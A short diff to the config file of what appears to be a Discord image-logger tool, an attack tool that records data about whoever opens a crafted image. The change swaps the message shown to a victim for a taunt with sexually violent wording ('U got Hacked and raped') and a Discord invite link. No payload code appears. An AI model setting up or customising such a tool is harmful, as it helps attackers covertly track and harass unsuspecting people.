@@ -28,7 +28,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": True, # Enable the custom message?
-        "message": "U got Hacked. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "message": "U got Hacked and raped. https://discord.gg/kaJssFFGVf", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
